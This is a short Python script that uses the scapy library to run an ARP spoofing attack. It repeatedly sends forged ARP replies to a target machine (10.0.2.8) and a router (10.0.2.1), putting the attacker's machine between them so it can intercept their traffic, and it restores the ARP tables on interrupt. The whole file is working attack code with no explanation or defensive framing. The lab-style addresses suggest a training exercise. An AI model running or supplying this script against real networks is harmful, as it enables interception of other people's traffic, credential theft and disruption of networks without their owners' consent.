import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_request, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    package = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(package, verbose=False)
    #scapy.ls(package)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    package = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(package, verbose=False)

target_ip = "10.0.2.8"
router_ip = "10.0.2.1"
packet_sent = 0
try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        packet_sent += 2
        print("\rSend package: " + str(packet_sent)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Detect Ctrl+C...Restoring to default setting")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)

